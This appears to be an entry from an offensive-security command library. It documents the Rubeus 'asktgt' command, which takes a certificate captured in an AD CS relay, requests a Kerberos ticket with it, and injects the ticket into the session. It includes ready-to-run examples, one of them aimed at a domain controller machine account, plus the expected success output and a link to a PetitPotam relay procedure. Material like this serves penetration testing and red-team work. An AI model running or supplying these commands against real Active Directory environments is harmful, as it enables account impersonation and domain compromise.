---
id: b95c2771-c0bf-48b1-9419-39af900bca96
name: rubeus-asktgt-certificate-ptt
type: command
executor: bash
data: 'Rubeus.exe asktgt /user:$_USERNAME /certificate:$_BASE64_CERT /ptt'
output: null
created_at: '2023-04-06T03:56:05.989122+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - kerberos
  - tgt
  - ptt
verified: true
validated: true
---

# rubeus-asktgt-certificate-ptt

## Command

```bash
Rubeus.exe asktgt /user:$_USERNAME /certificate:$_BASE64_CERT /ptt
```

## Description

Requests a Kerberos TGT using a base64-encoded certificate and passes the ticket to the current session.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /user:$_USERNAME | Target user/machine account (e.g., dc1$) | Yes |
| /certificate:$_BASE64_CERT | Base64 certificate from relay | Yes |
| /ptt | Pass-the-ticket to session | Yes |

## Examples

### For User

```bash
Rubeus.exe asktgt /user:user1 /certificate:MIIRdQIBAzC... /ptt
```

### For DC

```bash
Rubeus.exe asktgt /user:dc1$ /certificate:MIIRdQIBAzC...mUUXS /ptt
```

## Expected Output

[*] Action: Ask TGT
[*] TGT request successful!
[*] Ticket successfully imported to session

## Related

- [[procedures/AD-CS-Relay-Attack-with-Rubeus-and-PetitPotam]]
- [[tools/Rubeus]]
